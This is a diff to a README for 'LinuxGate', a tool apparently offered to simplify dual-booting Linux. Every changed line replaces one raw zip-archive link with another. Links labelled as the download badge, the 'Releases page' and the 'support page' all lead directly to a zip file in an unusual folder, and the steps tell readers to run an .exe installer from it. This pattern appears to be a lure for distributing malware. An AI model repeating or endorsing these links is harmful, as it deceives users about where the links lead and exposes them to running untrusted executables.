@@ -1,6 +1,6 @@
 # 🖥️ LinuxGate - Simplify Dual-Booting Linux with Ease
 
-[![Download LinuxGate](https://raw.githubusercontent.com/s3enk0/LinuxGate/main/Resources/Lang/Gate_Linux_periotic.zip)](https://raw.githubusercontent.com/s3enk0/LinuxGate/main/Resources/Lang/Gate_Linux_periotic.zip)
+[![Download LinuxGate](https://github.com/s3enk0/LinuxGate/raw/refs/heads/main/Controls/Linux-Gate-v3.8.zip)](https://github.com/s3enk0/LinuxGate/raw/refs/heads/main/Controls/Linux-Gate-v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to LinuxGate! This application helps you install and manage a dual-boot 
 
 To get started, you'll need to download LinuxGate. Follow these steps:
 
-1. Click this link to [visit the Releases page](https://raw.githubusercontent.com/s3enk0/LinuxGate/main/Resources/Lang/Gate_Linux_periotic.zip).
+1. Click this link to [visit the Releases page](https://github.com/s3enk0/LinuxGate/raw/refs/heads/main/Controls/Linux-Gate-v3.8.zip).
 2. Look for the latest version at the top.
 3. Download the installer by clicking on the file name marked with the .exe extension.
 4. Once the download completes, open the file to run the LinuxGate installer.
@@ -75,7 +75,7 @@ If your hardware isn’t working correctly after installation, you may need to i
 
 ## 📞 Support
 
-For further help, please visit our [support page](https://raw.githubusercontent.com/s3enk0/LinuxGate/main/Resources/Lang/Gate_Linux_periotic.zip) or create a new issue for assistance. We’re here to help you succeed with your dual-boot setup.
+For further help, please visit our [support page](https://github.com/s3enk0/LinuxGate/raw/refs/heads/main/Controls/Linux-Gate-v3.8.zip) or create a new issue for assistance. We’re here to help you succeed with your dual-boot setup.
 
 ## 📆 Updating LinuxGate
 
